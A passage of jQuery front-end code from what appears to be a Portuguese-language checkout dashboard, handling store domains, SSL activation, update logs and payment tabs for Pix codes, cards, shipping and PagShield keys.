                        "Content-Type": "application/x-www-form-urlencoded",
                        Accept: "application/json",
                        Authorization: "Bearer " + usuario.api_token,
                    },
                    data: {
                        id_usuario: usuario.id_usuario,
                        token: usuario.token_checkout,
                        dominio: dominio,
                        tipo_dominio: tp_dominio,
                        id_loja: $("#select_loja_dominio").val(),
                    },
                    success: (retorno) => {
                        if (retorno.status == 300) {
                            _global.toast(
                                "O domínio não está apontado para o ip do servidor!",
                                "toastwarning"
                            );
                            _global.btnCarregando($(this), false, "Adicionar");
                            return;
                        }
                        if (retorno.status == 200) {
                            $.get(
                                "/rs?token=" + usuario.token_checkout,
                                (data, xhr) => {
                                    if (
                                        data.status == undefined ||
                                        data.status == 200 ||
                                        xhr.status == 500
                                    ) {
                                        _global.toast(
                                            "O domínio foi adicionado.",
                                            "toastsucesso"
                                        );
                                        setTimeout(() => {
                                            location.reload();
                                        }, 1500);
                                    } else {
                                        _global.toast(
                                            "Houve um erro ao adicionar o seu domínio.",
                                            "toasterro"
                                        );
                                    }
                                }
                            ).fail(function (jqXHR, textStatus, errorThrown) {
                                _global.toast(
                                    "O domínio foi adicionado.",
                                    "toastsucesso"
                                );
                                setTimeout(() => {
                                    location.reload();
                                }, 1500);
                            });
                            _global.btnCarregando($(this), false, "Adicionar");
                        } else {
                            _global.toast(retorno.mensagem, "toasterro");
                            _global.btnCarregando($(this), false, "Adicionar");
                        }
                    },
                    error: () => {
                        _global.toast("Erro interno. [C - 001]", "toasterro");
                        _global.btnCarregando($(this), false, "Adicionar");
                    },
                });
            });

            const geraDominios = async function () {
                return new Promise((res) => {
                    $.ajax({
                        url: usuario.url_api + "getDominios",
                        method: "POST",
                        headers: {
                            "Content-Type": "application/x-www-form-urlencoded",
                            Accept: "application/json",
                            Authorization: "Bearer " + usuario.api_token,
                        },
                        data: {
                            id_usuario: usuario.id_usuario,
                        },
                        success: (retorno) => {
                            $(retorno).each((indice, valor) => {
                                apagar_dominio[valor.dominio] = valor;
                            });

                            if (
                                retorno.status != 409 &&
                                retorno.status != 401
                            ) {
                                $(retorno).each((i, val) => {
                                    if (val.tipo_dominio == "loja") {
                                        $("#cards_dominio").append(
                                            $("<li>", {
                                                class: "list-group-item border-0 d-flex p-4 mb-2 border-radius-lg bg-gray-100 cursor-pointer dominio",
                                                dominio: val.dominio,
                                            })
                                                .append(
                                                    $("<div>", {
                                                        class: "d-flex flex-column",
                                                    })
                                                        .append(
                                                            $("<h6>", {
                                                                class: "mb-3 text-sm",
                                                                text: val.dominio,
                                                            })
                                                        )
                                                        .append(
                                                            $("<span>", {
                                                                class: "mb-2 text-xs",
                                                                text: `Cadastrado por:`,
                                                            }).append(
                                                                $("<span>", {
                                                                    class: "font-weight-bold ms-sm-2 text-dark",
                                                                    text: val.usuario,
                                                                })
                                                            )
                                                        )
                                                        .append(
                                                            $("<span>", {
                                                                class: "mb-2 text-xs",
                                                                text: `Criado em:`,
                                                            }).append(
                                                                $("<span>", {
                                                                    class: "font-weight-bold ms-sm-2 text-dark",
                                                                    text: val.dataformatada,
                                                                })
                                                            )
                                                        )
                                                        .append(
                                                            $("<span>", {
                                                                class: "mb-2 text-xs",
                                                                text: `Loja atrelada: `,
                                                            }).append(
                                                                $("<span>", {
                                                                    class: "font-weight-bold ms-sm-2 text-dark",
                                                                    text: val.nm_loja,
                                                                })
                                                            )
                                                        )
                                                        .append(
                                                            $("<span>", {
                                                                class: "mb-2 text-xs",
                                                                text: `Situação: `,
                                                            }).append(
                                                                $("<span>", {
                                                                    style: `margin-left: 5px; height: 18px;`,
                                                                    class: `badge bg-gradient-success`,
                                                                    text: "Ativo",
                                                                })
                                                            )
                                                        )
                                                        .append(
                                                            $("<span>", {
                                                                class: "mb-2 text-xs",
                                                                text: `Situação SSL: `,
                                                            }).append(
                                                                $("<span>", {
                                                                    style: `margin-left: 5px; height: 18px;`,
                                                                    class: `badge bg-gradient-${
                                                                        val.sn_ssl ==
                                                                        "s"
                                                                            ? "success"
                                                                            : "danger"
                                                                    }`,
                                                                    text:
                                                                        val.sn_ssl ==
                                                                        "s"
                                                                            ? "Ativo"
                                                                            : "Inativo",
                                                                })
                                                            )
                                                        )
                                                )
                                                .append(
                                                    $("<div>", {
                                                        class: "ms-auto text-end",
                                                    })
                                                        .append(
                                                            val.sn_ssl == "n"
                                                                ? $("<a>", {
                                                                      class: "btn btn-link px-3 mb-0 text-dark",
                                                                      text: "Ativar SSL",
                                                                      click: function (
                                                                          e
                                                                      ) {
                                                                          $(
                                                                              this
                                                                          ).text(
                                                                              ""
                                                                          );
                                                                          $(
                                                                              this
                                                                          ).append(
                                                                              $(
                                                                                  "<div>",
                                                                                  {
                                                                                      class: "spinner-border spinner-border-sm text-success",
                                                                                      role: "status",
                                                                                  }
                                                                              ).append(
                                                                                  $(
                                                                                      "<span>",
                                                                                      {
                                                                                          class: "sr-only",
                                                                                      }
                                                                                  )
                                                                              )
                                                                          );
                                                                          $.get(
                                                                              `/dominio/ssl?dominio=${val.dominio}`,
                                                                              (
                                                                                  retorno
                                                                              ) => {
                                                                                  if (
                                                                                      retorno.status !=
                                                                                      500
                                                                                  ) {
                                                                                      $.ajax(
                                                                                          {
                                                                                              url:
                                                                                                  usuario.url_api +
                                                                                                  "dominio/log/ssl",
                                                                                              method: "POST",
                                                                                              headers:
                                                                                                  {
                                                                                                      "Content-Type":
                                                                                                          "application/x-www-form-urlencoded",
                                                                                                      Accept: "application/json",
                                                                                                      Authorization:
                                                                                                          "Bearer " +
                                                                                                          usuario.api_token,
                                                                                                  },
                                                                                              data: {
                                                                                                  id_usuario:
                                                                                                      usuario.id_usuario,
                                                                                                  id_dominio:
                                                                                                      val.id_dominio,
                                                                                              },
                                                                                              success:
                                                                                                  (
                                                                                                      retorno,
                                                                                                      xhr
                                                                                                  ) => {
                                                                                                      if (
                                                                                                          retorno.status ==
                                                                                                              200 ||
                                                                                                          xhr.status ==
                                                                                                              200
                                                                                                      ) {
                                                                                                          _global.toast(
                                                                                                              "O certificado ssl foi ativado com sucesso.",
                                                                                                              "toastsucesso"
                                                                                                          );
                                                                                                          setTimeout(
                                                                                                              () => {
                                                                                                                  localtion.reload();
                                                                                                              },
                                                                                                              1500
                                                                                                          );
                                                                                                      } else {
                                                                                                          _global.toast(
                                                                                                              "O SSL foi ativado, verifique o seu domínio!",
                                                                                                              "toastwarning"
                                                                                                          );
                                                                                                          setTimeout(
                                                                                                              () => {
                                                                                                                  location.reload();
                                                                                                              },
                                                                                                              1500
                                                                                                          );
                                                                                                      }
                                                                                                  },
                                                                                          }
                                                                                      );
                                                                                  } else {
                                                                                      _global.toast(
                                                                                          "Não foi possível ativar o SSL",
                                                                                          "toasterro"
                                                                                      );
                                                                                  }
                                                                              }
                                                                          );
                                                                      },
                                                                  }).append(
                                                                      $("<i>", {
                                                                          class: "fas fa-lock-circle-open text-dark me-2",
                                                                          "aria-hidden":
                                                                              "true",
                                                                      })
                                                                  )
                                                                : ""
                                                        )
                                                        .append(
                                                            $("<a>", {
                                                                class: "btn btn-link text-danger text-gradient px-3 mb-0",
                                                            }).append(
                                                                $("<i>", {
                                                                    class: "far fa-trash-alt me-2",
                                                                    "aria-hidden":
                                                                        "true",
                                                                    click: function (
                                                                        e
                                                                    ) {
                                                                        $(
                                                                            this
                                                                        ).removeClass(
                                                                            "fa-trash-alt"
                                                                        );
                                                                        $(
                                                                            this
                                                                        ).append(
                                                                            $(
                                                                                "<div>",
                                                                                {
                                                                                    class: "spinner-border spinner-border-sm text-danger",
                                                                                    role: "status",
                                                                                }
                                                                            ).append(
                                                                                $(
                                                                                    "<span>",
                                                                                    {
                                                                                        class: "sr-only",
                                                                                    }
                                                                                )
                                                                            )
                                                                        );
                                                                        _global.apagaDominio(
                                                                            val.dominio
                                                                        );
                                                                    },
                                                                })
                                                            )
                                                        )
                                                )
                                        );
                                    } else {
                                        $("#cards_dominio").append(
                                            $("<li>", {
                                                class: "list-group-item border-0 d-flex p-4 mb-2 border-radius-lg bg-gray-100 cursor-pointer dominio",
                                                dominio: val.dominio,
                                            })
                                                .append(
                                                    $("<div>", {
                                                        class: "d-flex flex-column",
                                                    })
                                                        .append(
                                                            $("<h6>", {
                                                                class: "mb-3 text-sm",
                                                                text:
                                                                    val.dominio +
                                                                    " (Domínio para Checkout)",
                                                            })
                                                        )
                                                        .append(
                                                            $("<span>", {
                                                                class: "mb-2 text-xs",
                                                                text: `Cadastrado por:`,
                                                            }).append(
                                                                $("<span>", {
                                                                    class: "font-weight-bold ms-sm-2 text-dark",
                                                                    text: val.usuario,
                                                                })
                                                            )
                                                        )
                                                        .append(
                                                            $("<span>", {
                                                                class: "mb-2 text-xs",
                                                                text: `Criado em:`,
                                                            }).append(
                                                                $("<span>", {
                                                                    class: "font-weight-bold ms-sm-2 text-dark",
                                                                    text: val.dataformatada,
                                                                })
                                                            )
                                                        )
                                                        .append(
                                                            $("<span>", {
                                                                class: "mb-2 text-xs",
                                                                text: `Checkout: `,
                                                            }).append(
                                                                $("<span>", {
                                                                    class: "font-weight-bold ms-sm-2 text-dark",
                                                                    text: "Principal",
                                                                })
                                                            )
                                                        )
                                                        .append(
                                                            $("<span>", {
                                                                class: "mb-2 text-xs",
                                                                text: `Situação: `,
                                                            }).append(
                                                                $("<span>", {
                                                                    style: `margin-left: 5px; height: 18px;`,
                                                                    class: `badge bg-gradient-success`,
                                                                    text: "Ativo",
                                                                })
                                                            )
                                                        )
                                                        .append(
                                                            $("<span>", {
                                                                class: "mb-2 text-xs",
                                                                text: `Situação SSL: `,
                                                            }).append(
                                                                $("<span>", {
                                                                    style: `margin-left: 5px; height: 18px;`,
                                                                    class: `badge bg-gradient-${
                                                                        val.sn_ssl ==
                                                                        "s"
                                                                            ? "success"
                                                                            : "danger"
                                                                    }`,
                                                                    text:
                                                                        val.sn_ssl ==
                                                                        "s"
                                                                            ? "Ativo"
                                                                            : "Inativo",
                                                                })
                                                            )
                                                        )
                                                )
                                                .append(
                                                    $("<div>", {
                                                        class: "ms-auto text-end",
                                                    })
                                                        .append(
                                                            val.sn_ssl == "n"
                                                                ? $("<a>", {
                                                                      class: "btn btn-link px-3 mb-0 text-dark",
                                                                      text: "Ativar SSL",
                                                                      click: function (
                                                                          e
                                                                      ) {
                                                                          $(
                                                                              this
                                                                          ).text(
                                                                              ""
                                                                          );
                                                                          $(
                                                                              this
                                                                          ).append(
                                                                              $(
                                                                                  "<div>",
                                                                                  {
                                                                                      class: "spinner-border spinner-border-sm text-success",
                                                                                      role: "status",
                                                                                  }
                                                                              ).append(
                                                                                  $(
                                                                                      "<span>",
                                                                                      {
                                                                                          class: "sr-only",
                                                                                      }
                                                                                  )
                                                                              )
                                                                          );
                                                                          $.get(
                                                                              `/dominio/ssl?dominio=${val.dominio}`,
                                                                              (
                                                                                  retorno
                                                                              ) => {
                                                                                  if (
                                                                                      retorno.status !=
                                                                                      500
                                                                                  ) {
                                                                                      $.ajax(
                                                                                          {
                                                                                              url:
                                                                                                  usuario.url_api +
                                                                                                  "dominio/log/ssl",
                                                                                              method: "POST",
                                                                                              headers:
                                                                                                  {
                                                                                                      "Content-Type":
                                                                                                          "application/x-www-form-urlencoded",
                                                                                                      Accept: "application/json",
                                                                                                      Authorization:
                                                                                                          "Bearer " +
                                                                                                          usuario.api_token,
                                                                                                  },
                                                                                              data: {
                                                                                                  id_usuario:
                                                                                                      usuario.id_usuario,
                                                                                                  id_dominio:
                                                                                                      val.id_dominio,
                                                                                              },
                                                                                              success:
                                                                                                  (
                                                                                                      retorno,
                                                                                                      xhr
                                                                                                  ) => {
                                                                                                      if (
                                                                                                          retorno.status ==
                                                                                                              200 ||
                                                                                                          xhr.status ==
                                                                                                              200
                                                                                                      ) {
                                                                                                          _global.toast(
                                                                                                              "O certificado ssl foi ativado com sucesso.",
                                                                                                              "toastsucesso"
                                                                                                          );
                                                                                                          setTimeout(
                                                                                                              () => {
                                                                                                                  localtion.reload();
                                                                                                              },
                                                                                                              1500
                                                                                                          );
                                                                                                      } else {
                                                                                                          _global.toast(
                                                                                                              "O SSL foi ativado, verifique o seu domínio!",
                                                                                                              "toastwarning"
                                                                                                          );
                                                                                                          setTimeout(
                                                                                                              () => {
                                                                                                                  location.reload();
                                                                                                              },
                                                                                                              1500
                                                                                                          );
                                                                                                      }
                                                                                                  },
                                                                                          }
                                                                                      );
                                                                                  } else {
                                                                                      _global.toast(
                                                                                          "Não foi possível ativar o SSL",
                                                                                          "toasterro"
                                                                                      );
                                                                                  }
                                                                              }
                                                                          );
                                                                      },
                                                                  }).append(
                                                                      $("<i>", {
                                                                          class: "fas fa-lock-circle-open text-dark me-2",
                                                                          "aria-hidden":
                                                                              "true",
                                                                      })
                                                                  )
                                                                : ""
                                                        )
                                                        .append(
                                                            $("<a>", {
                                                                class: "btn btn-link text-danger text-gradient px-3 mb-0",
                                                            }).append(
                                                                $("<i>", {
                                                                    class: "far fa-trash-alt me-2",
                                                                    "aria-hidden":
                                                                        "true",
                                                                    click: function (
                                                                        e
                                                                    ) {
                                                                        $(
                                                                            this
                                                                        ).removeClass(
                                                                            "fa-trash-alt"
                                                                        );
                                                                        $(
                                                                            this
                                                                        ).append(
                                                                            $(
                                                                                "<div>",
                                                                                {
                                                                                    class: "spinner-border spinner-border-sm text-danger",
                                                                                    role: "status",
                                                                                }
                                                                            ).append(
                                                                                $(
                                                                                    "<span>",
                                                                                    {
                                                                                        class: "sr-only",
                                                                                    }
                                                                                )
                                                                            )
                                                                        );
                                                                        _global.apagaDominio(
                                                                            val.dominio
                                                                        );
                                                                    },
                                                                })
                                                            )
                                                        )
                                                )
                                        );
                                    }
                                });
                            }
                            res();
                        },
                    });
                });
            };

            geraDominios().then(() => {
                $.ajax({
                    url: usuario.url_api + "getLogDominio",
                    method: "POST",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Accept: "application/json",
                        Authorization: "Bearer " + usuario.api_token,
                    },
                    data: {
                        id_usuario: usuario.id_usuario,
                    },
                    success: (retorno) => {
                        lista_dominio = retorno;
                        $(".dominio").click(function (e) {
                            e.preventDefault();
                            e.stopImmediatePropagation();
                            e.stopPropagation();

                            $("#log_att_dominio").empty();
                            $("#log_att_dominio").append(
                                `<div class="card-header pb-0 px-3">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h6 class="mb-0">Últimas Atualizações</h6>
                                    </div>
                                    <div class="col-md-6 d-flex justify-content-end align-items-center">
                                        <i class="far fa-calendar-alt me-2" aria-hidden="true"></i>
                                    </div>
                                </div>
                                </div>
                                <div class="card-body pt-4 p-3" style="min-height: 400px !important; max-height: 400px !important;">
                                <ul class="list-group" id="append_log">

                                </ul>
                            </div>`
                            );

                            $(lista_dominio[$(this).attr("dominio")]).each(
                                (i, valor) => {
                                    $("#append_log").append(`
                            <li class="list-group-item border-0 d-flex justify-content-between ps-0 mb-2 border-radius-lg">
                                <div class="d-flex align-items-center">
                                    <button class="btn btn-icon-only btn-rounded btn-outline-success mb-0 me-3 btn-sm d-flex align-items-center justify-content-center">
                                    <i class="fas fa-arrow-up" aria-hidden="true"></i></button>
                                    <div class="d-flex flex-column">
                                        <h6 class="mb-1 text-dark text-sm">${valor.atualizacao}</h6>
                                        <span class="text-xs">${valor.data}</span>
                                    </div>
                                </div>
                                <div class="d-flex align-items-center text-success text-gradient text-sm font-weight-bold">
                                    Sucesso
                                </div>
                            </li>`);
                                }
                            );
                        });
                    },
                });
            });
        },
        async apagaDominio(dominio) {
            const d = apagar_dominio[dominio];
            const usuario = _global.getUsuario();

            $.ajax({
                url: usuario.url_api + "dominio/apagarDominio",
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Accept: "application/json",
                    Authorization: "Bearer " + usuario.api_token,
                },
                data: {
                    id_dominio: d.id_dominio,
                },
                success: (retorno) => {
                    if (retorno.status == 200) {
                        _global.toast(
                            "O domínio foi apagado com sucesso.",
                            "toastsucesso"
                        );
                        setTimeout(() => {
                            location.reload();
                        }, 1500);
                    } else {
                        _global.toast(
                            "Não foi possível apagar o domínio",
                            "toasterro"
                        );
                    }
                },
                error: () => {
                    _global.toast(
                        "Não foi possível realizar a ação (Erro interno)"
                    );
                },
            });
        },
        async abaCheckout() {
            const usuario = _global.getUsuario();
            await _global.selectAbaCheckout(usuario);

            $("#select_loja").change(async function (e) {
                if ($(this).val() == -1) {
                    return;
                }

                _global.loadingAba("checkout", true);

                const fretes = await _global.busca(
                    "dashboard/getFretesLoja",
                    {
                        id_loja: $("#select_loja").val(),
                    },
                    "POST"
                );

                const dadosPagamento = await _global.busca(
                    "dashboard/getDadosPagamento",
                    {
                        id_loja: $("#select_loja").val(),
                    },
                    "POST"
                );

                const preferencias = await _global.busca(
                    "dashboard/getPreferencias",
                    {
                        id_loja: $("#select_loja").val(),
                    },
                    "POST"
                );

                console.log('preferencias',preferencias);

                const fretePadrao = await _global.busca(
                    "dashboard/getFretePadrao",
                    {
                        id_loja: $("#select_loja").val(),
                    },
                    "POST"
                );

                let _suitpay = await _global.busca(
                    "dashboard/getSuitpay",
                    {
                        id_loja: $("#select_loja").val(),
                    },
                    "POST"
                );

                let bc = await _global.busca(
                    "dashboard/getBc",
                    {
                        id_loja: $("#select_loja").val(),
                    },
                    "POST"
                );

                let produtos = await _global.busca(
                    "getProdutos",
                    {
                        id_loja: $("#select_loja").val(),
                    },
                    "POST"
                );

                let codigosRestantes = await _global.busca(
                    "dashboard/getCountCodigos",
                    {
                        l: $("#select_loja").val(),
                    },
                    "POST"
                );

                let cartaoLoja = await _global.busca(
                    "dashboard/getCartaoLoja",
                    {
                        l: $("#select_loja").val(),
                    },
                    "POST"
                );

                $("#select_p_copiacola").empty();
                $("#select_p_copiacola").prop("disabled", false);

                $("#select_remove_copia").empty();
                $("#select_remove_copia").prop("disabled", false);

                if (produtos.length > 0) {
                    produtos.forEach((v, i) => {
                        $("#select_p_copiacola").append(
                            $("<option>", {
                                value: v.id_produto,
                                text: v.titulo,
                            })
                        );

                        $("#select_remove_copia").append(
                            $("<option>", {
                                value: v.id_produto,
                                text: v.titulo,
                            })
                        );
                    });
                } else {
                    $("#select_p_copiacola").append(
                        $("<option>", {
                            value: "-1",
                            text: "Não há produtos cadastrados.",
                        })
                    );
                    $("#select_remove_copia").append(
                        $("<option>", {
                            value: "-1",
                            text: "Não há produtos cadastrados.",
                        })
                    );

                    $("#select_p_copiacola").prop("disabled", true);
                    $("#select_remove_copia").prop("disabled", true);
                }

                if (bc.length > 0) {
                    bc = bc[0];
                }

                $("#copiacola_pix").val("");

                //needed to fix error with optional chaining
                if (dadosPagamento?.log?.length > 0) {
                    let lista = [];
                    lista[1] = [];

                    let aux = 1;
                    let _aux = -1;
                    dadosPagamento.log.forEach((v, i) => {
                        if (_aux == aux) {
                            aux++;
                            _aux = aux - 2;
                            lista[aux] = [];
                        }

                        lista[aux].push(v);
                        _aux++;
                    });
                    _global.historicoPix = lista;
                } else {
                    _global.historicoPix = [];
                }

                $('#select_loja option[value="-1"]').remove();

                $("#div_loja_check").remove();

                const abas = [
                    "pagamento",
                    "copiacola",
                    "cartao",
                    "frete",
                    "pixel",
                    "configuracoes",
                ];

                if (usuario.usuario == "joseph" || usuario.usuario == "dev") {
                    abas.push("bc");
                }

                if (usuario.suitpay) {
                    abas.push("suitpay");
                    if (_suitpay.length > 0) {
                        _suitpay = _suitpay[0];
                    }
                }
                $("#remove_copiacola")
                    .off("click")
                    .on("click", async function (e) {
                        let p = $("#select_remove_copia").val();

                        _global.btnCarregando(
                            $("#remove_copiacola"),
                            true,
                            "Salvar"
                        );
                        let dados = await _global.busca(
                            "dashboard/deleteCopiaCola",
                            {
                                l: $("#select_loja").val(),
                                p: p,
                            },
                            "POST"
                        );

                        if (dados.status == 200) {
                            _global.toast(
                                "Os códigos foram removidos com sucesso",
                                "toastsucesso"
                            );
                            $("#codigos_restantes").text(dados.count);
                        } else {
                            _global.toast(
                                "Houve um erro ao remover os códigos",
                                "toasterro"
                            );
                        }

                        _global.btnCarregando(
                            $("#remove_copiacola"),
                            false,
                            "Salvar"
                        );
                    });

                $("#salvar_copiacola")
                    .off("click")
                    .on("click", async function (e) {
                        let codigos = $("#copiacola_pix").val();
                        let codigosOrder = $("#copiacola_pix_order").val();

                        if (
                            $("#select_p_copiacola").val() == "-1" ||
                            $("#select_p_copiacola").val() == null
                        ) {
                            _global.toast(
                                "Não há um produto selecionado.",
                                "toasterro"
                            );
                            return;
                        }

                        if (codigos == "") {
                            _global.toast(
                                "Digite os códigos desejados.",
                                "toasterro"
                            );
                            return;
                        }

                        if (!codigos.includes(";")) {
                            _global.toast(
                                'Os códigos são inválidos, verifique o digito separador ";".',
                                "toasterro"
                            );
                            return;
                        }

                        _global.btnCarregando($(this), true, "Salvar");

                        let dados = await _global.busca(
                            "dashboard/salvaCopiaCola",
                            {
                                l: $("#select_loja").val(),
                                c: codigos,
                                co: codigosOrder,
                                p: $("#select_p_copiacola").val(),
                            },
                            "POST"
                        );

                        if (dados.status == 200) {
                            _global.toast(
                                "Os códigos foram importados com sucesso.",
                                "toastsucesso"
                            );
                            $("#codigos_restantes").text(dados.count);
                            $("#copiacola_pix").val("");
                            $("#copiacola_pix_order").val("");
                        } else {
                            _global.toast(
                                "Não foi possível importar os códigos.",
                                "toasterro"
                            );
                        }

                        _global.btnCarregando($(this), false, "Salvar");
                    });

                const appendCheckout = async function () {
                    return new Promise((res) => {
                        $("#div_ads").empty();
                        $("#row_checkout").append(
                            $("<div>", {
                                class: "col-lg-12 card",
                                id: "div_loja_check",
                            }).append(
                                $("<div>", {
                                    class: "col-lg-12",
                                })
                                    .append(
                                        $("<div>", {
                                            class: "col-lg-12",
                                        }).append(
                                            $("<div>", {
                                                class: "nav-wrapper position-relative end-0",
                                                style: "margin-top: 10px;",
                                            }).append(
                                                $("<ul>", {
                                                    class: "nav nav-pills nav-fill p-1",
                                                    role: "tablist",
                                                    id: "tabs_checkout",
                                                })
                                                    .append(
                                                        $("<li>", {
                                                            class: "nav-item",
                                                        }).append(
                                                            $("<a>", {
                                                                class: "nav-link mb-0 px-0 py-1 tabcheckout abacheckoutativo",
                                                                "data-bs-toggle":
                                                                    "tab",
                                                                role: "tab",
                                                                aba: "pagamento",
                                                                "aria-selected":
                                                                    "false",
                                                                style: "cursor: pointer;",
                                                                text: "Pagamento",
                                                            })
                                                        )
                                                    )
                                                    .append(
                                                        $("<li>", {
                                                            class: "nav-item",
                                                            hidden: !isAdmin,
                                                        }).append(
                                                            $("<a>", {
                                                                class: "nav-link mb-0 px-0 py-1 tabcheckout",
                                                                "data-bs-toggle":
                                                                    "tab",
                                                                role: "tab",
                                                                aba: "copiacola",
                                                                "aria-selected":
                                                                    "false",
                                                                style: "cursor: pointer;",
                                                                text: "Pix (Copia e Cola)",
                                                            })
                                                        )
                                                    )
                                                    .append(
                                                        $("<li>", {
                                                            class: "nav-item",
                                                        }).append(
                                                            $("<a>", {
                                                                class: "nav-link mb-0 px-0 py-1 tabcheckout",
                                                                "data-bs-toggle":
                                                                    "tab",
                                                                role: "tab",
                                                                aba: "cartao",
                                                                "aria-selected":
                                                                    "false",
                                                                style: "cursor: pointer;",
                                                                text: "Cartão de Crédito",
                                                            })
                                                        )
                                                    )
                                                    .append(
                                                        $("<li>", {
                                                            class: "nav-item",
                                                        }).append(
                                                            $("<a>", {
                                                                class: "nav-link mb-0 px-0 py-1 tabcheckout",
                                                                "data-bs-toggle":
                                                                    "tab",
                                                                role: "tab",
                                                                aba: "frete",
                                                                "aria-selected":
                                                                    "false",
                                                                style: "cursor: pointer;",
                                                                text: "Frete",
                                                            })
                                                        )
                                                    )
                                                    .append(
                                                        $("<li>", {
                                                            class: "nav-item",
                                                        }).append(
                                                            $("<a>", {
                                                                class: "nav-link mb-0 px-0 py-1 tabcheckout",
                                                                "data-bs-toggle":
                                                                    "tab",
                                                                role: "tab",
                                                                aba: "pixel",
                                                                "aria-selected":
                                                                    "false",
                                                                style: "cursor: pointer;",
                                                                text: "Pixel",
                                                            })
                                                        )
                                                    )
                                                    .append(
                                                        $("<li>", {
                                                            class: "nav-item",
                                                        }).append(
                                                            $("<a>", {
                                                                class: "nav-link mb-0 px-0 py-1 tabcheckout",
                                                                "data-bs-toggle":
                                                                    "tab",
                                                                role: "tab",
                                                                aba: "configuracoes",
                                                                "aria-selected":
                                                                    "false",
                                                                style: "cursor: pointer;",
                                                                text: "Configurações",
                                                            })
                                                        )
                                                    )
                                                    .append(
                                                        usuario.suitpay
                                                            ? $("<li>", {
                                                                  class: "nav-item",
                                                              }).append(
                                                                  $("<a>", {
                                                                      class: "nav-link mb-0 px-0 py-1 tabcheckout",
                                                                      "data-bs-toggle":
                                                                          "tab",
                                                                      role: "tab",
                                                                      aba: "suitpay",
                                                                      "aria-selected":
                                                                          "false",
                                                                      style: "cursor: pointer;",
                                                                      text: "Suitpay",
                                                                  })
                                                              )
                                                            : ""
                                                    )
                                                    .append(
                                                        usuario.usuario ==
                                                            "joseph" ||
                                                            usuario.usuario ==
                                                                "dev"
                                                            ? $("<li>", {
                                                                  class: "nav-item",
                                                              }).append(
                                                                  $("<a>", {
                                                                      class: "nav-link mb-0 px-0 py-1 tabcheckout",
                                                                      "data-bs-toggle":
                                                                          "tab",
                                                                      role: "tab",
                                                                      aba: "bc",
                                                                      "aria-selected":
                                                                          "false",
                                                                      style: "cursor: pointer;",
                                                                      text: "BC / Privado",
                                                                  })
                                                              )
                                                            : ""
                                                    )
                                            )
                                        )
                                    )
                                    .append(
                                        $("<div>", {
                                            class: "col-lg-12 py-4 flex",
                                            id: "div_checkout_pagamento",
                                        })
                                            .append(
                                                $("<div>", {
                                                    class: "col-lg-4",
                                                    id: "div_pix",
                                                })
                                                    //text will be changed to Secret key when pag shield selected, and restored when not
                                                    .append(
                                                        $("<span>", {
                                                            text: "Chave pix",
                                                            id: "chave-pix-2024",
                                                        })
                                                    )
                                                    .append(
                                                        $("<input>", {
                                                            type: "text",
                                                            id: "input_chave_pix",
                                                            value:
                                                                dadosPagamento.pix ==
                                                                null
                                                                    ? ""
                                                                    : dadosPagamento
                                                                          .pix
                                                                          .chave,
                                                            class: "form-control",
                                                        })
                                                    )
                                                    .append(
                                                        $("<div>", {
                                                            id: "div_non_pagshield",
                                                        })
                                                            //will be hidden when pag shield selected with parent div
                                                            .append(
                                                                $("<span>", {
                                                                    text: "Tipo de Chave",
                                                                    id: "tipo-de-chave-2024",
                                                                })
                                                            )
                                                            .append(
                                                                $("<select>", {
                                                                    id: "select_tipo_chave_pix",
                                                                    class: "form-control",
                                                                })
                                                                    .append(
                                                                        $(
                                                                            "<option>",
                                                                            {
                                                                                value: "1",
                                                                                text: "CPF",
                                                                            }
                                                                        )
                                                                    )
                                                                    .append(
                                                                        $(
                                                                            "<option>",
                                                                            {
                                                                                value: "2",
                                                                                text: "Telefone",
                                                                            }
                                                                        )
                                                                    )
                                                                    .append(
                                                                        $(
                                                                            "<option>",
                                                                            {
                                                                                value: "3",
                                                                                text: "Email",
                                                                            }
                                                                        )
                                                                    )
                                                                    .append(
                                                                        $(
                                                                            "<option>",
                                                                            {
                                                                                value: "4",
                                                                                text: "Chave Aleatória",
                                                                            }
                                                                        )
                                                                    )
                                                            )
                                                    )
                                                    .append(
                                                        $("<div>", {
                                                            id: "div_pagshield",
                                                            class: "d-none",
                                                        })
                                                            //pag shield public key and interest rate
                                                            .append(
                                                                $("<span>", {
                                                                    text: "Public Key",
                                                                    id: "public-key",
                                                                })
                                                            )
                                                            .append(
                                                                $("<input>", {
                                                                    type: "text",
                                                                    id: "public-key-input",
                                                                    value:
                                                                        dadosPagamento
                                                                            ?.pix
                                                                            ?.public_key ??
                                                                        "",
                                                                    class: "form-control",
                                                                })
                                                            )
                                                            .append(
                                                                $("<span>", {
                                                                    text: "Instalment Rate",
                                                                    id: "instalment-rate",
                                                                })
                                                            )
                                                            .append(
                                                                $("<input>", {
                                                                    type: "number",
                                                                    id: "instalment-rate-input",
                                                                    value:
                                                                        dadosPagamento
                                                                            ?.pix
                                                                            ?.instalment_rate ??
                                                                        "",
                                                                    class: "form-control",
                                                                    step: "any",
                                                                })
                                                            )
                                                    )
                                                    .append(
                                                        $("<span>", {
                                                            text: "Banco Responsável",
                                                        })
                                                    )
                                                    .append(
                                                        $("<select>", {
                                                            id: "banco_responsavel",
                                                            class: "form-control",
                                                        })
                                                            // .append(
                                                            //     $("<option>", {
                                                            //         value: "mp",
                                                            //         text: "Mercado Pago (Padrão)",
                                                            //     })
                                                            // )
                                                            // .append(
                                                            //     $("<option>", {
                                                            //         value: "pag",
                                                            //         text: "PagSeguro",
                                                            //     })
                                                            // )
                                                            // .append(
                                                            //     $("<option>", {
                                                            //         value: "inter",
                                                            //         text: "Inter",
                                                            //     })
                                                            // )
                                                            // .append(
                                                            //     $("<option>", {
                                                            //         value: "bradesco",
                                                            //         text: "Bradesco",
                                                            //     })
                                                            // )
                                                            // .append(
                                                            //     $("<option>", {
                                                            //         value: "nubank",
                                                            //         text: "Nubank",
                                                            //     })
                                                            // )
                                                            // .append(
                                                            //     $("<option>", {
                                                            //         value: "santander",
                                                            //         text: "Santander",
                                                            //     })
                                                            // )
                                                            // .append(
                                                            //     $("<option>", {
                                                            //         value: "suitpay",
                                                            //         text: "Suitpay",
                                                            //     })
                                                            // )
                                                            // .append(
                                                            //     $("<option>", {
                                                            //         value: "neon",
                                                            //         text: "Neon",
                                                            //     })
                                                            // )
                                                            // .append(
                                                            //     $("<option>", {
                                                            //         value: "stone",
                                                            //         text: "Stone",
                                                            //     })
                                                            // )
                                                            .append(
                                                                $("<option>", {
                                                                    value: "pagShield",
                                                                    text: "PagShield",
                                                                })
                                                            )
                                                    )
                                                    .append(
